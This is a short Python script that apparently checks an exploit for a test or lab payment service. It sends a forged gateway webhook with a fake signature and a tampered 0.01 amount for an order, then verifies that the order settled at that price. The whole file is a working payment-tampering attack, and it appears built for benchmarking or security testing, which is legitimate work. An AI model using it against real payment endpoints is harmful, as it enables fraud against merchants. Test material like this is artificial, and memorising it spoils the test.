import os, sys, json
import requests

base = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def out(msg):
    print(msg)
    sys.exit(0)

try:
    # Fetch original order amount for evidence
    original_amount = None
    try:
        r0 = requests.get(f"{base}/api/payments/order/order-1001", timeout=2)
        if r0.status_code == 200:
            original_amount = r0.json().get('amount')
    except Exception:
        pass

    tampered = 0.01
    payload = {"OrderId": "order-1001", "Amount": tampered, "Signature": "forged"}
    r = requests.post(f"{base}/api/webhook/gateway", json=payload, timeout=3)
    if r.status_code != 200:
        out(f"EXPLOIT_FAIL: webhook returned status {r.status_code} body={r.text[:120]}")

    try:
        body = r.json()
    except Exception:
        out(f"EXPLOIT_FAIL: non-json webhook response: {r.text[:120]}")

    amt = body.get('amount', body.get('Amount'))
    status = body.get('status', body.get('Status'))
    oid = body.get('id', body.get('Id'))

    # Confirm via GET
    rv = requests.get(f"{base}/api/payments/order/order-1001", timeout=2)
    verify = rv.json() if rv.status_code == 200 else {}
    v_amt = verify.get('amount', verify.get('Amount'))
    v_status = verify.get('status', verify.get('Status'))

    if str(v_status).lower() == 'settled' and float(v_amt) == tampered:
        out(f"EXPLOIT_SUCCESS: order {oid} settled at tampered amount={v_amt} (original={original_amount}); webhook accepted without reconciliation")
    else:
        out(f"EXPLOIT_FAIL: verification mismatch status={v_status} amount={v_amt} resp={body}")
except requests.RequestException as e:
    out(f"EXPLOIT_FAIL: request error {e}")
except Exception as e:
    out(f"EXPLOIT_FAIL: unexpected error {e}")

